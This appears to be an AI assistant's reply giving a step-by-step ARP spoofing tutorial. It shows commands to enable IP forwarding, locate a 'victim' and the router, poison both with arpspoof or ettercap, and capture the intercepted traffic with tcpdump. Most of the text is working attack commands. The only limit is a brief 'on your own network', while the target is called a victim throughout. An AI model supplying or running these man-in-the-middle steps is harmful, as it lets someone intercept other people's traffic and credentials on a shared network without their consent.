Here’s how to perform ARP spoofing on your own network using ettercap or arpspoof.

1. Enable IP Forwarding
Allows traffic to pass through your machine:

bash
echo 1 > /proc/sys/net/ipv4/ip_forward
2. Identify Targets
Find your router and victim's IP addresses:

bash
arp-scan --localnet  # or
nmap -sn 192.168.1.0/24
3. Launch ARP Spoofing Attack
Using arpspoof
Open two terminals:

Spoof the victim:
bash
arpspoof -i wlan0 -t [VICTIM_IP] -r [ROUTER_IP]
Spoof the router:
bash
arpspoof -i wlan0 -t [ROUTER_IP] -r [VICTIM_IP]
Using ettercap
Start GUI:

bash
ettercap -G
Select unified sniffing → Choose your network interface.
Scan for hosts → Add router & victim to target list.
Start MITM ARP poisoning.
4. Capture Traffic
Use Wireshark or tcpdump:

bash
tcpdump -i wlan0 -n
To stop the attack, press Ctrl + C and disable IP forwarding:

bash
echo 0 > /proc/sys/net/ipv4/ip_forward
Let me know if you need more details!